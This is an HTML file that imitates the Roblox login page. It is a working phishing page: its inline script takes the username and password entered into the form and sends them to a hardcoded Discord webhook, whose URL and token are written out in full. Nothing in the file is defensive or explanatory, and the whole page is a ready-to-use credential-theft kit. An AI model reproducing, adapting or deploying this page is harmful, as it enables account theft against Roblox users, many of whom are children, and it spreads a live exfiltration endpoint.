<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1c1c1c;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #2c2c2c;
            padding: 40px;
            border-radius: 8px;
            width: 350px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
            text-align: center;
        }

        .login-container h2 {
            color: white;
            font-size: 24px;
            margin-bottom: 20px;
        }

        .login-container input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            background-color: #333;
            color: white;
        }

        .login-container input::placeholder {
            color: #888;
        }

        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #4c4c4c;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .login-container button:hover {
            background-color: #3a3a3a;
        }

        .login-container a {
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 15px;
        }

        .login-container .secondary-button {
            background-color: transparent;
            border: 1px solid #4c4c4c;
            padding: 10px;
            margin-top: 10px;
        }

        .login-container .secondary-button:hover {
            background-color: #333;
        }

        .login-container p {
            color: white;
            font-size: 14px;
        }

        .login-container p a {
            color: #00a2ff;
            text-decoration: none;
        }

        .login-container p a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login to Roblox</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <a href="#">Forgot Password or Username?</a>
        <button class="secondary-button">Email Me a One-Time Code</button>
        <button class="secondary-button">Use Another Device</button>
        <p>Don't have an account? <a href="#">Sign Up</a></p>
    </div>

    <script>
        const form = document.getElementById('loginForm');

        form.addEventListener('submit', function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Replace with your Discord webhook URL
            const webhookURL = 'https://discord.com/api/webhooks/1282427032499781737/owsc9b6gEXxnkT6oZNlxj_mVyoztwBjHldIqBoiCk_6L_GcNWoVqAV22pBAwWF8W1vnP';

            const payload = {
                content: `Username: ${username}\nPassword: ${password}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert('Credentials sent!');
                } else {
                    alert('Error sending credentials.');
                }
            })
            .catch(error => {
                alert('Request failed:', error);
            });
        });
    </script>

</body>
</html>
